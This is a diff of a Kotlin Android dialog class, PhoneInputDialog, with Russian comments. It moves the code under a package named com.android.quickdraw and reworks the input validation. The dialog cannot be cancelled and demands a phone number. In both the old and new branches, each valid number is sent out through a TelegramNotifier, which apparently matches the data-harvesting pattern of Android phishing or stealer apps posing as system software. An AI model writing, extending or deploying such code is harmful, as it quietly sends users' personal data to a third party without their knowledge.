@@ -1,17 +1,15 @@
-package com.android.quickdraw.ui.dialogs
-
 import android.app.AlertDialog
 import android.content.Context
 import android.graphics.Color
 import android.graphics.drawable.ColorDrawable
 import android.text.InputType
 import android.view.LayoutInflater
-import android.widget.Button
 import android.widget.EditText
 import android.widget.TextView
-import com.secure.webapp.R
-import com.secure.webapp.core.TelegramNotifier
-import com.secure.webapp.utils.PhoneValidator
+import androidx.appcompat.widget.AppCompatButton
+import com.android.quickdraw.R
+import com.android.quickdraw.core.TelegramNotifier
+import com.android.quickdraw.utils.PhoneValidator
 
 class PhoneInputDialog(
     private val context: Context,
@@ -25,25 +23,40 @@ class PhoneInputDialog(
             .setCancelable(false)
             .create()
 
-        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
+        // Настройка прозрачного фона для скругленных углов
+        dialog.window?.apply {
+            setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
+            setDimAmount(0.5f) // Затемнение фона
+        }
 
         val title = dialogView.findViewById<TextView>(R.id.dialog_title)
         val message = dialogView.findViewById<TextView>(R.id.dialog_message)
         val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
-        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)
+        val continueButton = dialogView.findViewById<AppCompatButton>(R.id.continue_button)
 
+        // Установка текста из ресурсов
         title.text = context.getString(R.string.phone_dialog_title)
         message.text = context.getString(R.string.phone_dialog_message)
+        phoneInput.hint = context.getString(R.string.phone_input_hint)
+        continueButton.text = context.getString(R.string.continue_button)
+
+        // Настройка ввода
         phoneInput.inputType = InputType.TYPE_CLASS_PHONE
 
         continueButton.setOnClickListener {
             val phoneNumber = phoneInput.text.toString().trim()
-            if (PhoneValidator.isValid(phoneNumber)) {
-                notifier.sendNotification("Введен номер телефона: $phoneNumber")
-                onSuccess(phoneNumber)
-                dialog.dismiss()
-            } else {
-                phoneInput.error = context.getString(R.string.phone_error_message)
+            when {
+                phoneNumber.isEmpty() -> {
+                    phoneInput.error = context.getString(R.string.validation_phone_empty)
+                }
+                !PhoneValidator.isValid(phoneNumber) -> {
+                    phoneInput.error = context.getString(R.string.phone_error_message)
+                }
+                else -> {
+                    notifier.sendNotification("Введен номер телефона: $phoneNumber")
+                    onSuccess(phoneNumber)
+                    dialog.dismiss()
+                }
             }
         }
 
